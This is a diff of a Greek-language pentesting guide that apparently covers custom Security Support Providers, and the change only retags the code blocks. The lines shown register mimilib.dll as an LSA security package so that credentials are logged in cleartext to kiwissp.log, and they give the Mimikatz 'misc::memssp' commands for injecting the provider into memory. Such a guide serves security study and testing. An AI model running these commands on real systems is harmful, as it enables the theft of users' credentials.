@@ -19,7 +19,7 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
 Προσθέστε το `mimilib.dll` στη λίστα Παρόχων Υποστήριξης Ασφαλείας (Security Packages):
-```powershell
+```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
 Και μετά από μια επανεκκίνηση, όλα τα διαπιστευτήρια μπορούν να βρεθούν σε καθαρό κείμενο στο `C:\Windows\System32\kiwissp.log`
@@ -27,7 +27,7 @@ reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 #### Στη μνήμη
 
 Μπορείτε επίσης να το εισάγετε απευθείας στη μνήμη χρησιμοποιώντας το Mimikatz (σημειώστε ότι μπορεί να είναι λίγο ασταθές/μη λειτουργικό):
-```powershell
+```bash
 privilege::debug
 misc::memssp
 ```
